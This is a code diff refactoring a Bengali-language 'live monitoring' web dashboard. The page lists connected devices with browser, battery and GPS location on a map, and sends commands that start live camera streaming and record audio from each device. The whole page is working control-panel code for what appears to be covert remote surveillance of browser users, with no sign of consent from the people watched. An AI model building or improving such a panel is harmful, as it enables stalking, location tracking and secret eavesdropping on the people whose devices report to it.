@@ -12,35 +12,30 @@
         body { background: #0f172a; color: #e2e8f0; padding: 20px; }
         h1 { text-align: center; margin-bottom: 20px; color: #38bdf8; }
         .dashboard { display: flex; flex-wrap: wrap; gap: 20px; }
-        .map-container { flex: 2; min-width: 300px; height: 500px; background: #1e293b; border-radius: 15px; overflow: hidden; position: relative; }
+        .map-container { flex: 2; min-width: 300px; height: 500px; background: #1e293b; border-radius: 15px; overflow: hidden; }
         #map { height: 100%; width: 100%; }
         .info-panel { flex: 1; min-width: 300px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
         .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
-        
-        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; cursor: pointer; transition: 0.2s; }
-        .device-card:hover { background: #1e293b; transform: scale(1.01); }
+        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #22c55e; cursor: pointer; transition: 0.2s; }
+        .device-card:hover { background: #1e293b; }
         .device-card.active { border-left-color: #facc15; background: #1e293b; }
         .device-card .name { font-weight: bold; font-size: 16px; color: #38bdf8; }
         .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 6px; line-height: 1.4; }
         .device-card .detail b { color: #e2e8f0; }
-        .online { border-left-color: #22c55e; }
         .no-data { text-align: center; color: #64748b; margin-top: 50px; }
-        
         .action-btns { display: flex; gap: 10px; margin-top: 10px; }
-        .btn { flex: 1; color: white; border: none; padding: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .btn { flex: 1; color: white; border: none; padding: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; }
         .btn:hover { opacity: 0.8; }
         .btn-start { background: #22c55e; }
         .btn-stop { background: #ef4444; }
         .btn-audio { background: #8b5cf6; }
-
         .video-modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); flex-direction: column; justify-content: center; align-items: center; }
-        .video-container { width: 90%; max-width: 800px; background: black; border-radius: 10px; overflow: hidden; position: relative; border: 2px solid #38bdf8; box-shadow: 0 0 20px rgba(56, 189, 248, 0.3); }
+        .video-container { width: 90%; max-width: 800px; background: black; border-radius: 10px; overflow: hidden; border: 2px solid #38bdf8; }
         .video-container img { width: 100%; display: block; }
         .video-header { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 10px 20px; }
         .close-video-btn { background: #ef4444; color: white; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; }
-        .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; text-align: center; }
+        .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; text-align: center; min-width: 300px; }
         .modal-content audio { width: 100%; margin-top: 10px; }
         .close-btn { margin-top: 15px; background: #38bdf8; border: none; padding: 10px 20px; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
     </style>
@@ -48,32 +43,26 @@
 <body>
     <h1>📡 লাইভ মনিটরিং ড্যাশবোর্ড</h1>
     <div class="dashboard">
-        <div class="map-container">
-            <div id="map"></div>
-        </div>
+        <div class="map-container"><div id="map"></div></div>
         <div class="info-panel">
-            <h2>📱 কানেক্টেড ডিভাইস <span style="font-size:12px; color:#64748b;">(লোকেশন দেখতে ক্লিক করুন)</span></h2>
-            <div id="deviceList">
-                <div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>
-            </div>
+            <h2>📱 কানেক্টেড ডিভাইস <span style="font-size:12px;color:#64748b;">(ক্লিক = লোকেশন)</span></h2>
+            <div id="deviceList"><div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div></div>
         </div>
     </div>
 
-    <!-- লাইভ ভিডিও মডাল -->
     <div id="videoModal" class="video-modal">
         <div class="video-container">
             <div class="video-header">
-                <h3 id="videoTitle" style="color: #38bdf8; font-size: 16px;">লাইভ ক্যামেরা</h3>
+                <h3 id="videoTitle" style="color:#38bdf8;font-size:16px;">লাইভ ক্যামেরা</h3>
                 <button class="close-video-btn" onclick="closeVideo()">বন্ধ করুন</button>
             </div>
             <img id="liveVideoFeed" src="" alt="Waiting for video feed...">
         </div>
     </div>
 
-    <!-- অডিও মডাল -->
     <div id="audioModal" class="modal">
         <div class="modal-content">
-            <h3 style="margin-bottom: 10px; color: #38bdf8;">🎙️ রেকর্ড করা অডিও</h3>
+            <h3 style="color:#38bdf8;margin-bottom:10px;">🎙️ রেকর্ড করা অডিও</h3>
             <audio id="modalAudio" controls></audio>
             <br>
             <button class="close-btn" onclick="closeAudioModal()">বন্ধ করুন</button>
@@ -82,123 +71,124 @@
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        let map = L.map('map').setView([23.8103, 90.4125], 12);
+        const map = L.map('map').setView([23.8103, 90.4125], 12);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             attribution: '&copy; OpenStreetMap'
         }).addTo(map);
-        
+
         let markers = {};
         let lastAudTime = {};
-        let activeLiveVideoId = null; 
+        let activeLiveVideoId = null;
         let selectedDeviceId = null;
+        let clientsCache = {};
 
         function fetchClients() {
-            // ✅ এখানে cache ব্লক করা হয়েছে: ?t=... এবং cache: 'no-store'
-            fetch('/api/clients?t=' + new Date().getTime(), { cache: 'no-store' })
-                .then(res => res.json())
+            fetch('/api/clients?t=' + Date.now(), { cache: 'no-store' })
+                .then(r => r.json())
                 .then(clients => {
-                    const list = document.getElementById('deviceList');
-                    list.innerHTML = '';
-                    const clientIds = Object.keys(clients);
-
-                    if (clientIds.length === 0) {
-                        list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
-                        Object.keys(markers).forEach(id => {
-                            map.removeLayer(markers[id]);
-                            delete markers[id];
-                        });
-                        return;
-                    }
-
-                    clientIds.forEach(id => {
-                        const data = clients[id];
-                        const card = document.createElement('div');
-                        card.className = 'device-card online' + (selectedDeviceId === id ? ' active' : '');
-                        
-                        card.onclick = () => {
-                            selectedDeviceId = id;
-                            if (data.lat && data.lng && data.lat !== 0) {
-                                map.flyTo([parseFloat(data.lat), parseFloat(data.lng)], 16, { duration: 1.5 });
-                            }
-                        };
-                        
-                        card.innerHTML = `
-                            <div class="name">📱 ${data.device || 'অজানা ডিভাইস'}</div>
-                            <div class="detail">🌐 ব্রাউজার: <b>${data.browser || 'N/A'}</b></div>
-                            <div class="detail">🔋 ব্যাটারি: <b>${data.battery || 'N/A'}%</b></div>
-                            <div class="detail">📍 অবস্থান: <b>${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</b></div>
-                            
-                            <div class="action-btns">
-                                <button class="btn btn-start" onclick="event.stopPropagation(); sendCommand('${id}', 'start_live')">📹 লাইভ ভিডিও</button>
-                                <button class="btn btn-stop" onclick="event.stopPropagation(); sendCommand('${id}', 'stop_live')">⏹️ বন্ধ</button>
-                                <button class="btn btn-audio" onclick="event.stopPropagation(); sendCommand('${id}', 'record_audio')">🎙️ অডিও</button>
-                            </div>
-                        `;
-                        list.appendChild(card);
-
-                        if (data.video_frame && data.video_time) {
-                            if (activeLiveVideoId === id) {
-                                document.getElementById('liveVideoFeed').src = data.video_frame;
-                            }
-                        }
-
-                        if (data.audio_data && data.audio_time && lastAudTime[id] !== data.audio_time) {
-                            lastAudTime[id] = data.audio_time;
-                            document.getElementById('modalAudio').src = data.audio_data;
-                            document.getElementById('audioModal').style.display = 'flex';
-                            document.getElementById('modalAudio').play();
-                        }
-
-                        if (data.lat && data.lng && data.lat !== 0) {
-                            const pos = [parseFloat(data.lat), parseFloat(data.lng)];
-                            if (markers[id]) {
-                                markers[id].setLatLng(pos);
-                            } else {
-                                markers[id] = L.marker(pos).addTo(map);
-                                if (!selectedDeviceId) {
-                                    map.flyTo(pos, 16, { duration: 1.5 });
-                                    selectedDeviceId = id;
-                                }
-                            }
-                        }
-                    });
+                    clientsCache = clients;
+                    renderList(clients);
                 })
-                .catch(err => console.error("Fetch error:", err));
+                .catch(e => console.error("fetchClients:", e));
+        }
+
+        function renderList(clients) {
+            const list = document.getElementById('deviceList');
+            const ids = Object.keys(clients);
+            list.innerHTML = '';
+
+            if (ids.length === 0) {
+                list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
+                Object.keys(markers).forEach(id => { map.removeLayer(markers[id]); delete markers[id]; });
+                return;
+            }
+
+            ids.forEach(id => {
+                const d = clients[id];
+                const card = document.createElement('div');
+                card.className = 'device-card' + (selectedDeviceId === id ? ' active' : '');
+                card.onclick = () => {
+                    selectedDeviceId = id;
+                    if (d.lat && d.lng) map.flyTo([parseFloat(d.lat), parseFloat(d.lng)], 16, { duration: 1.2 });
+                };
+                card.innerHTML = `
+                    <div class="name">📱 ${d.device || 'অজানা'}</div>
+                    <div class="detail">🌐 <b>${d.browser || 'N/A'}</b></div>
+                    <div class="detail">🔋 <b>${d.battery || 'N/A'}%</b> ${d.charging === 'true' ? '⚡' : ''}</div>
+                    <div class="detail">📍 <b>${d.lat ? parseFloat(d.lat).toFixed(5) : 'N/A'}, ${d.lng ? parseFloat(d.lng).toFixed(5) : ''}</b></div>
+                    <div class="action-btns">
+                        <button class="btn btn-start" onclick="event.stopPropagation(); sendCommand('${id}','start_live')">📹 লাইভ</button>
+                        <button class="btn btn-stop" onclick="event.stopPropagation(); sendCommand('${id}','stop_live')">⏹️ বন্ধ</button>
+                        <button class="btn btn-audio" onclick="event.stopPropagation(); sendCommand('${id}','record_audio')">🎙️ অডিও</button>
+                    </div>`;
+                list.appendChild(card);
+
+                // মার্কার আপডেট
+                if (d.lat && d.lng && parseFloat(d.lat) !== 0) {
+                    const pos = [parseFloat(d.lat), parseFloat(d.lng)];
+                    if (markers[id]) markers[id].setLatLng(pos);
+                    else {
+                        markers[id] = L.marker(pos).addTo(map);
+                        if (!selectedDeviceId) { map.flyTo(pos, 16); selectedDeviceId = id; }
+                    }
+                }
+
+                // অডিও নতুন হলে
+                if (d.audio_time && lastAudTime[id] !== d.audio_time) {
+                    lastAudTime[id] = d.audio_time;
+                    fetch('/api/audio?id=' + encodeURIComponent(id))
+                        .then(r => r.json())
+                        .then(a => {
+                            if (a.audio_data) {
+                                document.getElementById('modalAudio').src = a.audio_data;
+                                document.getElementById('audioModal').style.display = 'flex';
+                                document.getElementById('modalAudio').play().catch(() => {});
+                            }
+                        });
+                }
+            });
+        }
+
+        // লাইভ ভিডিও — শুধু সক্রিয় ডিভাইসের জন্য আলাদা পোলিং (দ্রুত)
+        function pollVideo() {
+            if (!activeLiveVideoId) return;
+            fetch('/api/video?id=' + encodeURIComponent(activeLiveVideoId), { cache: 'no-store' })
+                .then(r => r.json())
+                .then(v => {
+                    if (v.video_frame) document.getElementById('liveVideoFeed').src = v.video_frame;
+                })
+                .catch(e => console.error("pollVideo:", e))
+                .finally(() => setTimeout(pollVideo, 400));
         }
 
         function sendCommand(clientId, command) {
             if (command === 'start_live') {
                 activeLiveVideoId = clientId;
                 document.getElementById('videoModal').style.display = 'flex';
-                document.getElementById('liveVideoFeed').src = ""; 
-            } else if (command === 'stop_live') {
-                if (activeLiveVideoId === clientId) {
-                    activeLiveVideoId = null;
-                    document.getElementById('videoModal').style.display = 'none';
-                }
+                document.getElementById('liveVideoFeed').src = '';
+                pollVideo();
+            } else if (command === 'stop_live' && activeLiveVideoId === clientId) {
+                activeLiveVideoId = null;
+                document.getElementById('videoModal').style.display = 'none';
             }
-
             fetch('/api/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ client_id: clientId, command: command })
-            }).catch(err => console.error("Command error:", err));
+                body: JSON.stringify({ client_id: clientId, command })
+            }).catch(e => console.error("sendCommand:", e));
         }
 
         function closeVideo() {
-            if (activeLiveVideoId) {
-                sendCommand(activeLiveVideoId, 'stop_live');
-            }
+            if (activeLiveVideoId) sendCommand(activeLiveVideoId, 'stop_live');
             document.getElementById('videoModal').style.display = 'none';
         }
-
         function closeAudioModal() {
             document.getElementById('audioModal').style.display = 'none';
             document.getElementById('modalAudio').pause();
         }
 
         fetchClients();
-        setInterval(fetchClients, 1000); 
+        setInterval(fetchClients, 4000);  // ✅ ১ সেকেন্ডের বদলে ৪ সেকেন্ড
     </script>
 </body>
 </html>
